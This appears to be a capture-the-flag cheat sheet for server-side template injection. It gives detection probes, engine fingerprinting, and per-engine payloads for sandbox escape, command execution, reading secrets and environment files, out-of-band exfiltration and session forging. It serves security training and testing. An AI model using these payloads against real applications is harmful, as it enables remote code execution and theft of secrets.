# End-to-end SSTI workflow — from reflection to flag

The complete chain: find the render-point → fingerprint → prove
eval → reach objects → impact. Each step has a falsifier.

---

## Phase 0 — is it actually a template?

```text
Input renders back → candidate. Then one arithmetic probe:
{{7*7}} → 49 = evaluated = SSTI shape.
{{7*7}} → "{{7*7}}" = literal = NOT SSTI (maybe XSS/echo).
{{7*7}} → "7777777" = string-mul? → Python-adjacent (Jinja/Mako).
{{7*7}} → error/500 = engine tried to parse = still evidence.
```

Discriminate string-mul — `{{'7'*7}}` → `7777777` (Python),
`7*7` → `49` everywhere. If `49` — engine confirmed, find WHICH.

## Phase 1 — fingerprint (cheap, ordered)

```text
1. {{7*'7'}} → 7777777 → Python/Jinja2/Tornado/Mako   (str-mul)
             → 49      → PHP/Twig, JS/Nunjucks? (Nunjucks: 7777777)
             → "7*'7'" → not evaluated
2. {{7/0}}  → ZeroDivisionError → Python stack → Jinja2/Mako/Tornado
            → TwigException → Twig
            → FreeMarkerException → FreeMarker
            → Velocity silent → Velocity
3. {{a}}    → undefined-rendered-empty vs error → engine conventions
4. ${7*7}   → 49 → FreeMarker/Velocity/Pebble/Jinjava/Groovy
5. <%=7*7%> → 49 → EJS/ERB/ASP
6. #{7*7}   → 49 → Slim/OGNL?/Pug-adjacent
7. {{a.b}} → 'a' undefined → dotted-access allowed?
8. {{config}} → config-object → Flask-Jinja2 almost-certain
9. {{7*7}} on error-page → Spring-Thymeleaf pattern
```

The discrimination table is in `detection.md` — use its full matrix.

## Phase 2 — bound-object enumeration

```jinja2
{{config}} {{self}} {{request}} {{session}} {{g}}
{{_context}} {{_context|keys}}          -- Jinja/Twig full vars
{{lipsum}} {{cycler}} {{joiner}} {{namespace}}
{{url_for}} {{get_flashed_messages}}
{{app}} {{this}} {{smarty}}             -- PHP-side
${request} ${response} ${context}       -- Java-side
{{settings}} {{environment}} {{beans}}
```

Every printed object is a reach-inventory — read attribute names.

## Phase 3 — sandbox escape by engine

```text
Jinja2:   lipsum.__globals__.os / self.__init__.__globals__ /
          subclasses → catch_warnings → __builtins__
Twig:     _self.env.registerUndefinedFilterCallback('exec') (v1)
          or ['id']|map('system') (v2) / app.request.server
FreeMarker: ?new → Execute/ObjectConstructor
Velocity: .class.forName Runtime / $class.inspect / $render
Thymeleaf: T(Runtime).exec / beans / preprocessing
ERB:      <%= system() %> — direct ruby
Slim:     #{system()} — direct
EJS:      <%= process.binding %> / require('child_process')
Nunjucks: range.__globals__ / cycler — jinja-paths often work
Smarty:   {php} / {if eval} / {math eval}
Groovy:   'x'.execute()
Pug:      #{...} — arbitrary JS
```

## Phase 4 — impact paths (ordered by value)

```text
1. {{config}} / app.config           → flag/SECRET_KEY — try FIRST
2. os.environ                        → flag env-var
3. file read:                        → /flag /proc/self/environ
   jinja: open() / config.from_pyfile / loader.getSourceContext
   twig:  include/source / file_get_contents-map
   java:  Scanner/File/Files.readAllBytes
   ruby:  File.read / %x(cat)
4. exec: popen/system/exec/ProcessBuilder/`backticks`
5. exfil — if blind: dns/http OOB via exec or fetch-gadgets
6. forge: SECRET_KEY → session-forge → admin → flag (chain)
```

## Phase 5 — write-up evidence

Every probe's response goes through hooks: `http_probe` for the
request+response pair, `post-probe --verdict confirms` with the
verbatim excerpt showing 49/environ/flag.

---

## Falsifiers — when to stop

```text
- {{7*7}} renders literal after 3 engine-variant probes → not SSTI
- engine confirmed but every object-access errors → sandbox-solid
  → try alternate object/fn names once each, then park the class
- eval works but output suppressed + no OOB channel → blind-solid
  → try time-sidechannel once; still silent → escalate strategy
- .class/forName/?api all blocked (Java) → resolver-hardened
  → bound-bean enumeration is the only door left
- map/filter callables restricted (Twig) → version-patched
  → _context enumeration + bound beans still viable
```

## The engine→first-10-probes table

| Engine | Probes 1-3 | Probes 4-7 | Probes 8-10 |
|---|---|---|---|
| Jinja2 | `{{7*7}}` `{{config}}` `{{self}}` | `{{lipsum}}` `{{request}}` `{{g}}` | `{{lipsum.__globals__}}` `{{_context}}` subclasses-map |
| Twig | `{{7*7}}` `{{_self}}` `{{app}}` | `{{_context}}` `{{['x']\|map('id')}}` `{{_self.env}}` | registerUndefinedFilterCallback / source() |
| FreeMarker | `${7*7}` `${.data_model}` `${x?api}` | `?new` Execute test `.getClass()` | ObjectConstructor include |
| Velocity | `$x.class` `#set($a=1)` `$context` | `$class.inspect` `$render` forName | Runtime.exec chain |
| Thymeleaf | `*{7*7}` `__${7*7}__` `*{beans}` | `*{T(java.lang.Math)}` ctx-objects | T(Runtime).exec |
| ERB | `<%=7*7%>` `<%=self%>` `<%=ENV%>` | `<%=%x(id)%>` File.read | `<%=system%>` cookies |
| EJS | `<%=7*7%>` `<%=global%>` `<%=process%>` | `<%=require%>` `<%=this%>` | child_process chain |
| Smarty | `{$x}` `{php}1{/php}` `{$smarty}` | `{if system('id')}` `{math}` | const/server reads |
